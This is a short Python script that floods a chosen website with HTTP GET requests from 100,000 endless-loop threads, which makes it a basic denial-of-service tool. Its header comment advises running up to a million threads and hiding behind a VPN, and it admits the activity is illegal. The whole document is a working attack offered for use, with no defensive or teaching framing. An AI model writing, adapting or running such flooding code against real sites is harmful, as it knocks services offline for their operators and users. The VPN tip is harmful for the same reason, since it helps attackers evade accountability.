""" 
Use from 100 to 1_000_000 threads.
It depends on the speed of the Internet
and the power of your PC. Don’t forget
about VPN and the fact that it is
illegal and violates several dozen
administrative statutes of your country.
"""

"""
pip install requests
"""


import requests
import threading

target_url = "https://!your_website!/"  # your website

def send_request():
    while True:
        try:
            response = requests.get(target_url)
            print(f"Request sent: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

threads = []

for i in range(100_000):  # streams
    thread = threading.Thread(target=send_request)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
  
